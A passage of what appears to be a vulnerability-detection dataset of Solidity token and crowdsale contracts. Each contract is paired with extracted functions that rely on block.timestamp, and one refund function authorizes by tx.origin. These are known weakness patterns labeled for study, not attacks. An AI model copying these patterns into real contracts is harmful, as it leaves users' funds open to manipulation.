{\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function refundTokens(address _from, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {\n if (tx.origin != _from) {\n error('refundTokens: tx.origin did not request the refund directly');\n return false;\n }\n if (addressSCICO != msg.sender) {\n error('refundTokens: caller is not the current ICO address');\n return false;\n }\n if (balances[_from] < _amount) {\n error('refundTokens: the amount to transfer is higher than your token balance');\n return false;\n }\n if(!SCComplianceService.validate(_from, addressSCICO, _amount)) {\n error('transfer: not allowed by the compliance service');\n return false;\n }\n balances[_from] = balances[_from].sub(_amount);\n balances[addressSCICO] = balances[addressSCICO].add(_amount);\n emit Transfer(_from, addressSCICO, _amount);\n return true;\n }\n function setMyICOContract(address _SCICO) public onlyOwner {\n addressSCICO = _SCICO;\n }\n function setComplianceService(address _addressSCComplianceService) public onlyOwner {\n addressSCComplianceService = _addressSCComplianceService;\n SCComplianceService = ComplianceService(addressSCComplianceService);\n }\n function updateTimeLock(uint256 _timelockEndTime) onlyOwner public returns (bool) {\n timelockEndTime = _timelockEndTime;\n emit UpdateTimeLock(_timelockEndTime);\n return true;\n }\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event Approval(address indexed _owner, address indexed _spender, uint256 _amount);\n event UpdateTimeLock(uint256 _timelockEndTime);\n}",
  "extract_feature": [
    "function timestamp() public constant returns (uint256) {\nreturn block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb6"
  },
  "filename": "10146.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract KOIOSToken is StandardToken, Ownable {\n using SafeMath for uint256;\n string public name = \"KOIOS\";\n string public symbol = \"KOI\";\n uint256 public decimals = 5;\n uint256 public totalSupply = 1000000000 * (10 ** uint256(decimals));\n function KOIOSToken(string _name, string _symbol, uint256 _decimals, uint256 _totalSupply) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n totalSupply = _totalSupply;\n totalSupply_ = _totalSupply;\n balances[msg.sender] = totalSupply;\n }\n function () public payable {\n revert();\n }\n}\ncontract KOIOSTokenSale is Ownable {\n using SafeMath for uint256;\n KOIOSToken public token;\n uint256 public startingTimestamp = 1518696000;\n uint256 public endingTimestamp = 1521115200;\n uint256 public tokenPriceInEth = 0.0001 ether;\n uint256 public tokensForSale = 400000000 * 1E5;\n uint256 public totalTokenSold;\n uint256 public totalEtherRaised;\n mapping(address => uint256) public etherRaisedPerWallet;\n address public wallet;\n bool internal isClose = false;\n event WalletChange(address _wallet, uint256 _timestamp);\n event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount, uint256 _timestamp);\n event TransferManual(address indexed _from, address indexed _to, uint256 _value, string _message);\n function KOIOSTokenSale(address _token, uint256 _startingTimestamp, uint256 _endingTimestamp, uint256 _tokensPerEth, uint256 _tokensForSale, address _wallet) public {\n token = KOIOSToken(_token);\n startingTimestamp = _startingTimestamp;\n endingTimestamp = _endingTimestamp;\n tokenPriceInEth = 1E18 / _tokensPerEth;\n tokensForSale = _tokensForSale;\n wallet = _wallet;\n }\n function isValidPurchase(uint256 value, uint256 amount) internal constant returns (bool) {\n bool validTimestamp = startingTimestamp <= block.timestamp && endingTimestamp >= block.timestamp;\n bool validValue = value != 0;\n bool validRate = tokenPriceInEth > 0;\n bool validAmount = tokensForSale.sub(totalTokenSold) >= amount && amount > 0;\n return validTimestamp && validValue && validRate && validAmount && !isClose;\n }\n function calculate(uint256 value) public constant returns (uint256) {\n uint256 tokenDecimals = token.decimals();\n uint256 tokens = value.mul(10 ** tokenDecimals).div(tokenPriceInEth);\n return tokens;\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n uint256 value = msg.value;\n uint256 tokens = calculate(value);\n require(isValidPurchase(value , tokens));\n totalTokenSold = totalTokenSold.add(tokens);\n totalEtherRaised = totalEtherRaised.add(value);\n etherRaisedPerWallet[msg.sender] = etherRaisedPerWallet[msg.sender].add(value);\n token.transfer(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, value, tokens, now);\n }\n function transferManual(address _to, uint256 _value, string _message) onlyOwner public returns (bool) {\n require(_to != address(0));\n token.transfer(_to , _value);\n TransferManual(msg.sender, _to, _value, _message);\n return true;\n }\n function setWallet(address _wallet) onlyOwner public returns(bool) {\n wallet = _wallet;\n WalletChange(_wallet , now);\n return true;\n }\n function withdraw() onlyOwner public {\n wallet.transfer(this.balance);\n }\n function close() onlyOwner public {\n uint256 tokens = token.balanceOf(this);\n token.transfer(owner , tokens);\n withdraw();\n isClose = true;\n }\n}\ncontract KOIOSTokenPreSale is Ownable {\n using SafeMath for uint256;\n KOIOSToken public token;\n uint256 public startingTimestamp = 1527811200;\n uint256 public endingTimestamp = 1528156799;\n uint256 public tokenPriceInEth = 0.00005 ether;\n uint256 public tokensForSale = 400000000 * 1E5;\n uint256 public totalTokenSold;\n uint256 public totalEtherRaised;\n mapping(address => uint256) public etherRaisedPerWallet;\n address public wallet;\n bool internal isClose = false;\n event WalletChange(address _wallet, uint256 _timestamp);\n event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount, uint256 _timestamp);\n event TransferManual(address indexed _from, address indexed _to, uint256 _value, string _message);\n mapping(address => uint256) public lockupPhase1;\n uint256 public phase1Duration = 90 * 86400;\n mapping(address => uint256) public lockupPhase2;\n uint256 public phase2Duration = 120 * 86400;\n mapping(address => uint256) public lockupPhase3;\n uint256 public phase3Duration = 150 * 86400;\n mapping(address => uint256) public lockupPhase4;\n uint256 public phase4Duration = 180 * 86400;\n uint256 public totalLockedBonus;\n function KOIOSTokenPreSale(address _token, uint256 _startingTimestamp, uint256 _endingTimestamp, uint256 _tokensPerEth, uint256 _tokensForSale, address _wallet) public {\n token = KOIOSToken(_token);\n startingTimestamp = _startingTimestamp;\n endingTimestamp = _endingTimestamp;\n tokenPriceInEth = 1E18 / _tokensPerEth;\n tokensForSale = _tokensForSale;\n wallet = _wallet;\n }\n function isValidPurchase(uint256 value, uint256 amount) internal constant returns (bool) {\n bool validTimestamp = startingTimestamp <= block.timestamp && endingTimestamp >= block.timestamp;\n bool validValue = value != 0;\n bool validRate = tokenPriceInEth > 0;\n bool validAmount = tokensForSale.sub(totalTokenSold) >= amount && amount > 0;\n return validTimestamp && validValue && validRate && validAmount && !isClose;\n }\n function getBonus(uint256 _value) internal pure returns (uint256) {\n uint256 bonus = 0;\n if(_value >= 1E18) {\n bonus = _value.mul(50).div(1000);\n }if(_value >= 5E18) {\n bonus = _value.mul(75).div(1000);\n }if(_value >= 10E18) {\n bonus = _value.mul(100).div(1000);\n }if(_value >= 20E18) {\n bonus = _value.mul(150).div(1000);\n }if(_value >= 30E18) {\n bonus = _value.mul(200).div(1000);\n }\n return bonus;\n }\n function calculate(uint256 value) public constant returns (uint256) {\n uint256 tokenDecimals = token.decimals();\n uint256 tokens = value.mul(10 ** tokenDecimals).div(tokenPriceInEth);\n return tokens;\n }\n function lockBonus(address _sender, uint bonusTokens) internal returns (bool) {\n uint256 lockedBonus = bonusTokens.div(4);\n lockupPhase1[_sender] = lockupPhase1[_sender].add(lockedBonus);\n lockupPhase2[_sender] = lockupPhase2[_sender].add(lockedBonus);\n lockupPhase3[_sender] = lockupPhase3[_sender].add(lockedBonus);\n lockupPhase4[_sender] = lockupPhase4[_sender].add(lockedBonus);\n totalLockedBonus = totalLockedBonus.add(bonusTokens);\n return true;\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n uint256 _value = msg.value;\n uint256 tokens = calculate(_value);\n uint256 bonusTokens = calculate(getBonus(_value));\n lockBonus(beneficiary, bonusTokens);\n uint256 _totalTokens = tokens.add(bonusTokens);\n require(isValidPurchase(_value , _totalTokens));\n totalTokenSold = totalTokenSold.add(_totalTokens);\n totalEtherRaised = totalEtherRaised.add(_value);\n etherRaisedPerWallet[msg.sender] = etherRaisedPerWallet[msg.sender].add(_value);\n token.transfer(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, _value, tokens, now);\n }\n function isValidRelease(uint256 amount) internal constant returns (bool) {\n bool validAmount = amount > 0;\n return validAmount;\n }\n function releaseBonus() public {\n uint256 releaseTokens = 0;\n if(block.timestamp > (startingTimestamp.add(phase1Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase1[msg.sender]);\n lockupPhase1[msg.sender] = 0;\n }\n if(block.timestamp > (startingTimestamp.add(phase2Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase2[msg.sender]);\n lockupPhase2[msg.sender] = 0;\n }\n if(block.timestamp > (startingTimestamp.add(phase3Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase3[msg.sender]);\n lockupPhase3[msg.sender] = 0;\n }\n if(block.timestamp > (startingTimestamp.add(phase4Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase4[msg.sender]);\n lockupPhase4[msg.sender] = 0;\n }\n totalLockedBonus = totalLockedBonus.sub(releaseTokens);\n token.transfer(msg.sender, releaseTokens);\n }\n function releasableBonus(address _owner) public constant returns (uint256) {\n uint256 releaseTokens = 0;\n if(block.timestamp > (startingTimestamp.add(phase1Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase1[_owner]);\n }\n if(block.timestamp > (startingTimestamp.add(phase2Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase2[_owner]);\n }\n if(block.timestamp > (startingTimestamp.add(phase3Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase3[_owner]);\n }\n if(block.timestamp > (startingTimestamp.add(phase4Duration)))\n {\n releaseTokens = releaseTokens.add(lockupPhase4[_owner]);\n }\n return releaseTokens;\n }\n function transferManual(address _to, uint256 _value, string _message) onlyOwner public returns (bool) {\n require(_to != address(0));\n token.transfer(_to , _value);\n TransferManual(msg.sender, _to, _value, _message);\n return true;\n }\n function setWallet(address _wallet) onlyOwner public returns(bool) {\n wallet = _wallet;\n WalletChange(_wallet , now);\n return true;\n }\n function withdraw() onlyOwner public {\n wallet.transfer(this.balance);\n }\n function close() onlyOwner public {\n uint256 tokens = token.balanceOf(this).sub(totalLockedBonus);\n token.transfer(owner , tokens);\n withdraw();\n isClose = true;\n }\n}",
  "extract_feature": [
    "function isValidPurchase(uint256 value, uint256 amount) internal constant returns (bool) {\nbool validTimestamp = startingTimestamp <= block.timestamp && endingTimestamp >= block.timestamp;\nbool validValue = value != 0;\nbool validRate = tokenPriceInEth > 0;\nbool validAmount = tokensForSale.sub(totalTokenSold) >= amount && amount > 0;\nreturn validTimestamp && validValue && validRate && validAmount && !isClose;\n}",
    "function isValidPurchase(uint256 value, uint256 amount) internal constant returns (bool) {\nbool validTimestamp = startingTimestamp <= block.timestamp && endingTimestamp >= block.timestamp;\nbool validValue = value != 0;\nbool validRate = tokenPriceInEth > 0;\nbool validAmount = tokensForSale.sub(totalTokenSold) >= amount && amount > 0;\nreturn validTimestamp && validValue && validRate && validAmount && !isClose;\n}",
    "function releaseBonus() public {\nuint256 releaseTokens = 0;\nif(block.timestamp > (startingTimestamp.add(phase1Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase1[msg.sender]);\nlockupPhase1[msg.sender] = 0;\n}\nif(block.timestamp > (startingTimestamp.add(phase2Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase2[msg.sender]);\nlockupPhase2[msg.sender] = 0;\n}\nif(block.timestamp > (startingTimestamp.add(phase3Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase3[msg.sender]);\nlockupPhase3[msg.sender] = 0;\n}\nif(block.timestamp > (startingTimestamp.add(phase4Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase4[msg.sender]);\nlockupPhase4[msg.sender] = 0;\n}\ntotalLockedBonus = totalLockedBonus.sub(releaseTokens);\ntoken.transfer(msg.sender, releaseTokens);\n}",
    "function releasableBonus(address _owner) public constant returns (uint256) {\nuint256 releaseTokens = 0;\nif(block.timestamp > (startingTimestamp.add(phase1Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase1[_owner]);\n}\nif(block.timestamp > (startingTimestamp.add(phase2Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase2[_owner]);\n}\nif(block.timestamp > (startingTimestamp.add(phase3Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase3[_owner]);\n}\nif(block.timestamp > (startingTimestamp.add(phase4Duration)))\n{\nreleaseTokens = releaseTokens.add(lockupPhase4[_owner]);\n}\nreturn releaseTokens;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb7"
  },
  "filename": "10163.sol",
  "content": "pragma solidity ^0.4.23;\ncontract NokuPricingPlan {\n function payFee(bytes32 serviceName, uint256 multiplier, address client) public returns(bool paid);\n function usageFee(bytes32 serviceName, uint256 multiplier) public constant returns(uint fee);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BurnableERC20 is ERC20 {\n function burn(uint256 amount) public returns (bool burned);\n}\ncontract NokuTokenBurner is Pausable {\n using SafeMath for uint256;\n event LogNokuTokenBurnerCreated(address indexed caller, address indexed wallet);\n event LogBurningPercentageChanged(address indexed caller, uint256 indexed burningPercentage);\n address public wallet;\n uint256 public burningPercentage;\n uint256 public burnedTokens;\n uint256 public transferredTokens;\n constructor(address _wallet) public {\n require(_wallet != address(0), \"_wallet is zero\");\n wallet = _wallet;\n burningPercentage = 100;\n emit LogNokuTokenBurnerCreated(msg.sender, _wallet);\n }\n function setBurningPercentage(uint256 _burningPercentage) public onlyOwner {\n require(0 <= _burningPercentage && _burningPercentage <= 100, \"_burningPercentage not in [0, 100]\");\n require(_burningPercentage != burningPercentage, \"_burningPercentage equal to current one\");\n burningPercentage = _burningPercentage;\n emit LogBurningPercentageChanged(msg.sender, _burningPercentage);\n }\n function tokenReceived(address _token, uint256 _amount) public whenNotPaused {\n require(_token != address(0), \"_token is zero\");\n require(_amount > 0, \"_amount is zero\");\n uint256 amountToBurn = _amount.mul(burningPercentage).div(100);\n if (amountToBurn > 0) {\n assert(BurnableERC20(_token).burn(amountToBurn));\n burnedTokens = burnedTokens.add(amountToBurn);\n }\n uint256 amountToTransfer = _amount.sub(amountToBurn);\n if (amountToTransfer > 0) {\n assert(BurnableERC20(_token).transfer(wallet, amountToTransfer));\n transferredTokens = transferredTokens.add(amountToTransfer);\n }\n }\n}\ncontract NokuFlatPlan is NokuPricingPlan, Ownable {\n using SafeMath for uint256;\n event LogNokuFlatPlanCreated(\n address indexed caller,\n uint256 indexed paymentInterval,\n uint256 indexed flatFee,\n address nokuMasterToken,\n address tokenBurner\n );\n event LogPaymentIntervalChanged(address indexed caller, uint256 indexed paymentInterval);\n event LogFlatFeeChanged(address indexed caller, uint256 indexed flatFee);\n uint256 public paymentInterval;\n uint256 public nextPaymentTime;\n uint256 public flatFee;\n address public nokuMasterToken;\n address public tokenBurner;\n constructor(\n uint256 _paymentInterval,\n uint256 _flatFee,\n address _nokuMasterToken,\n address _tokenBurner\n )\n public\n {\n require(_paymentInterval != 0, \"_paymentInterval is zero\");\n require(_flatFee != 0, \"_flatFee is zero\");\n require(_nokuMasterToken != 0, \"_nokuMasterToken is zero\");\n require(_tokenBurner != 0, \"_tokenBurner is zero\");\n paymentInterval = _paymentInterval;\n flatFee = _flatFee;\n nokuMasterToken = _nokuMasterToken;\n tokenBurner = _tokenBurner;\n nextPaymentTime = block.timestamp;\n emit LogNokuFlatPlanCreated(\n msg.sender,\n _paymentInterval,\n _flatFee,\n _nokuMasterToken,\n _tokenBurner\n );\n }\n function setPaymentInterval(uint256 _paymentInterval) public onlyOwner {\n require(_paymentInterval != 0, \"_paymentInterval is zero\");\n require(_paymentInterval != paymentInterval, \"_paymentInterval equal to current one\");\n paymentInterval = _paymentInterval;\n emit LogPaymentIntervalChanged(msg.sender, _paymentInterval);\n }\n function setFlatFee(uint256 _flatFee) public onlyOwner {\n require(_flatFee != 0, \"_flatFee is zero\");\n require(_flatFee != flatFee, \"_flatFee equal to current one\");\n flatFee = _flatFee;\n emit LogFlatFeeChanged(msg.sender, _flatFee);\n }\n function isValidService(bytes32 _serviceName) public pure returns(bool isValid) {\n return _serviceName != 0;\n }\n function payFee(bytes32 _serviceName, uint256 _multiplier, address _client) public returns(bool paid) {\n require(isValidService(_serviceName), \"_serviceName in invalid\");\n require(_multiplier != 0, \"_multiplier is zero\");\n require(_client != 0, \"_client is zero\");\n require(block.timestamp < nextPaymentTime);\n return true;\n }\n function usageFee(bytes32 _serviceName, uint256 _multiplier) public constant returns(uint fee) {\n require(isValidService(_serviceName), \"_serviceName in invalid\");\n require(_multiplier != 0, \"_multiplier is zero\");\n return 0;\n }\n function paySubscription(address _client) public returns(bool paid) {\n require(_client != 0, \"_client is zero\");\n nextPaymentTime = nextPaymentTime.add(paymentInterval);\n assert(ERC20(nokuMasterToken).transferFrom(_client, tokenBurner, flatFee));\n NokuTokenBurner(tokenBurner).tokenReceived(nokuMasterToken, flatFee);\n return true;\n }\n}",
  "extract_feature": [
    "function payFee(bytes32 _serviceName, uint256 _multiplier, address _client) public returns(bool paid) {\nrequire(isValidService(_serviceName), \"_serviceName in invalid\");\nrequire(_multiplier != 0, \"_multiplier is zero\");\nrequire(_client != 0, \"_client is zero\");\nrequire(block.timestamp < nextPaymentTime);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb8"
  },
  "filename": "10186.sol",
  "content": "pragma solidity ^0.4.20;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= 